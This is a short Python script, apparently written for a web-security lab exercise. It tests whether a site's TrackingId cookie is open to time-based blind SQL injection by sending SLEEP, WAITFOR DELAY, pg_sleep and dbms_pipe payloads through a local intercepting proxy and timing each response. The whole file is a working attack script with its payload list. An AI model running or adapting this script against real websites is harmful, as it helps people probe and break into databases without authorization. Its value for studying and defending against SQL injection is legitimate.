import requests
import urllib3
import sys
import urllib

urllib3.disable_warnings()

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def sqli_time_delays(url):
    sqli_payloads_list = ["'  (SELECT SLEEP(10))--", "' + (WAITFOR DELAY '0:0:10')--", "' || (SELECT pg_sleep(10))--", "' || (dbms_pipe.receive_message(('a'), 10))--"]

    for sqli_payload in sqli_payloads_list:
        sqli_payload_uncoded = urllib.parse.quote_plus(sqli_payload)
        cookies = {'TrackingId': 'T5S6EBszwFNgGK8Q' + sqli_payload_uncoded, 'session': 'KolZc7mTmgzgNpccOwbuNclosKuJinKX'}
        res = requests.get(url, cookies=cookies, verify=False, proxies=proxies )

        if res.elapsed.total_seconds() >= 10.0:
            print(f"[+] Sucessfully caused a uncondtional time delay of 10 secs using the SQLi query - {sqli_payload}")
        else:
            print(f"[-] Unsuccessful in causing time delays with SQLi query - {sqli_payload}")

        print('[+] Time taked:', res.elapsed.total_seconds())



def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1].strip()
    print("[+] Checking if tracking cookie is vulnerable to time-based blind SQLi...")
    sqli_time_delays(url)

if __name__ == '__main__':
    main()